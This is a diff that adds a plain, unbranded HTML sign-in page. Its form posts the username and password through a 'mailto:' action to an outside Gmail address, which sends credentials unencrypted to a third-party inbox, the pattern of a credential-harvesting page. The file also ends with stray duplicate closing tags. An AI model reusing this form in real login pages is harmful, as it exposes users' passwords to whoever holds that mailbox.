@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #000000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      width: 300px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #000000;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: calc(100% - 20px);
+      /* Adjust width to account for padding */
+      padding: 10px;
+      margin: 10px 10px 10px 10px;
+      /* Add equal spacing inside the container */
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      /* Ensure consistent box model */
+    }
+
+    input[type="submit"] {
+      background-color: #000000;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #520bed;
+    }
+
+    .forgot-password {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .forgot-password a {
+      color: #000000;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <h2>Sign In</h2>
+    <form action="mailto: tecrix.io@gmail.com" method="post">
+      <input type="text" name="username" placeholder="Username or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="submit" value="Sign In">
+    </form>
+    <div class="forgot-password">
+      <a href="#">Forgot Password?</a>
+    </div>
+  </div>
+</body>
+
+</html>
+</head>
+
+</html>
